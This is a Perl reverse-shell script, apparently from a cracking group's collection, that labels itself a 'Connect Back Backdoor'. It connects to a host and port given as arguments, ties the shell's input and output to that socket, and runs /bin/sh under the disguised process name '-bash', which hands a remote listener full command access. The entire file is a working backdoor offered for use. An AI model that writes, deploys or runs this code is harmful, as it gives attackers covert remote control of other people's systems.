#!/usr/bin/perl
use Socket;
print "Q8Crackers Crew  Connect Back Backdoor\n\n";
if (!$ARGV[0]) {
  printf "Usage: $0 [Fuck Host] <nc port>\n";
  exit(1);
}
print "[*] Q8Crackers\n";
$host = $ARGV[0];
$port = 80;
if ($ARGV[1]) {
  $port = $ARGV[1];
}
print "[*] Love You KoKo...\n";
$proto = getprotobyname('tcp') || die("Unknown Protocol\n");
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
my $target = inet_aton($host);
if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
  die("can't be connect\n");
}
print "[*] Spawning Shell\n";
if (!fork( )) {
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  exec {'/bin/sh'} '-bash' . "\0" x 4;
  exit(0);
}
print "[*] oWnD\n\n";